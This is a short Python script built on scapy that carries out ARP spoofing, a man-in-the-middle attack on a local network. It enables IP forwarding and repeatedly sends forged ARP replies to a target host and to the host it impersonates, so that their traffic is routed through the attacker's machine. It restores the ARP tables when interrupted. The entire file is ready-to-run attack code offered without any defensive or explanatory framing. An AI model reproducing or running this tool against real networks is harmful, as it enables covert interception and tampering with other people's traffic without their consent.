#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse
import subprocess

def spoof_sender(target_ip,spoof_ip):
    response=scapy.ARP(op=2,psrc=spoof_ip,hwdst=net_scan(target_ip),pdst=target_ip)
    scapy.send(response,verbose=False)

def net_scan(ip):
    arp_packet_whohas=scapy.ARP(pdst=ip)
    ether_frame=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    complete_arp_packet=ether_frame/arp_packet_whohas
    ans_list,unans_list=scapy.srp(complete_arp_packet,timeout=1,verbose=False)
    return ans_list[0][1].hwsrc

def restore(target_ip,spoofed_ip):
    resp_packet=scapy.ARP(op=2,hwdst=net_scan(target_ip),psrc=spoofed_ip,hwsrc=net_scan(spoofed_ip),pdst=target_ip)
    scapy.send(resp_packet,count=4,verbose=False)

def get_arguments():
    parser=argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target_ip",help="Enter the target's IP")
    parser.add_argument("-s","--spoofip",dest="spoof_ip",help="Enter the spoof IP ")
    arg=parser.parse_args()
    return arg.target_ip,arg.spoof_ip


target_ip,spoof_ip=get_arguments()
if not target_ip:
    print("[-]Please enter the target IP")
    exit()
elif not spoof_ip:
    print("[-]Please enter the spoof IP")
    exit()
try:
    pckt_ctr=0
    print("[+]Enabled port forwarding:")
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    while True:
        spoof_sender(target_ip,spoof_ip)
        spoof_sender(spoof_ip,target_ip)
        print("\r[+]Sent "+str(pckt_ctr)+" packets"),
        sys.stdout.flush()
        pckt_ctr+=2
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+]Quitting...And restoring...")
    restore(target_ip,spoof_ip)
    restore(spoof_ip,target_ip)
    print("[+]Disabling port forwarding")
    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=0"])
